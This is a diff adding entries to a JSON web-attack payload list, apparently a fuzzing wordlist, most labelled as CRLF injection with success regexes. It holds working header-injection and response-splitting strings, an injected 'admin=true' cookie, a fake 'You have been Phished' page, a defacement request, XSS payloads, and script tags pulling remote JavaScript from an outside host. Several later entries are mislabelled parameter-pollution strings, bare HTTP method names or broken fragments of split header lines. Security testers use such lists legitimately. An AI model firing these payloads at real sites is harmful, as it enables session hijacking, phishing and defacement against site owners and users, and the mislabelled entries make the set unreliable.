@@ -768,5 +768,3569 @@
       "expected_status_code": 200,
       "success_regex": "Set-Cookie|Location:|alert"
     }
+  },
+  {
+    "payload_id": "OWP-215097",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Set-Cookie: sessionid=abc123",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215098",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Set-Cookie: sessionid=value",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215099",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Set-Cookie: admin=true",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215100",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215101",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Set-Cookie:en",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215102",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215103",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Length: 34",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215104",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<html>You have been Phished</html>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215106",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Date: Tue, 20 Dec 2016 14:34:03 GMT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215108",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Length: 22907",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215110",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215111",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ETag: \"842fe-597b-54415a5c97a80\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215112",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Vary: Accept-Encoding",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215114",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Server: NetDNA-cache/2.2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215115",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Link: https://example.com/[INJECTION STARTS HERE]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215116",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Content-Length:35",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215118",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "23",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215119",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<svg onload=alert(document.domain)>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215120",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0aLocation:%20http://myweb.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215121",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-215122",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393629",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0a%0d%0a",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393630",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393631",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0d%0a%0a",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393632",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "0x0D0x0A",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393633",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "0x0D0x0D0x0A0x0A",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393634",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%5cr%5cn",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393635",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0%0d%0ad%0%0d%0aa",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393636",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0%0D%0AD%0%0D%0AA",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393637",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393638",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393639",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393640",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393641",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393642",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393643",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393644",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393645",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393646",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=id=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393647",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&id=1?id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393648",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id['&id=1']=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393649",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id[1&id=2]=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393650",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&id=1&id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393651",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=1%26id%3D2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393652",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id&id=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393653",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "????id=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393654",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&&&&id=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393655",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=id['1']=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393656",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=1#id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393657",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id==1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393658",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id===1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393659",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ";id=1?id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393660",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id;id=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393661",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&id=1;id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393662",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "#id=1?id=2&id=3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393663",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=1,2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393664",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id1,id2=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393665",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id[=1&id=2]=3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393666",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id[&id=2]=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393667",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=[1,2]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393668",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id&=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393669",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id[]=1&id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393670",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=/:@&=+$&id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393671",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id[=/:@&=+$&id=2]=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393672",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id={id:{id:1},2}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393673",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id[{id:{id[]:1},2}]=3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393674",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=%23?id=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393675",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=1%26id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393676",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=1%2526id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393677",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=1%c0%a6id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393678",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=1\\uc0a6id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393679",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=1&amp;id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393680",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=1&#38;id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393681",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?id=1%u0026;id=2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393682",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "# Header Injection / Cache Poison 1.0  (fuzz the entire get req) (12 April 2010)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393683",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "GET http://{SITE}testsite.com/redir.php?site=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aContent-Length:%2020%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1GET http://{SITE}/{REDIRECTURL}?site=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aContent-Length:%2020%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393684",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "OPTIONS",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393685",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "GET",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393686",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "HEAD",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393687",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "PUT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393688",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "DELETE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393689",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "TRACK",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393690",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "CONNECT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393691",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "PROPFIND",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393692",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "PROPPATCH",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393693",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "MKCOL",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393694",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "COPY",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393695",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "MOVE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393696",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "LOCK",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393697",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "UNLOCK",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393698",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "VERSION-CONTROL",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393699",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "CHECKOUT",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393700",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "CHECKIN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
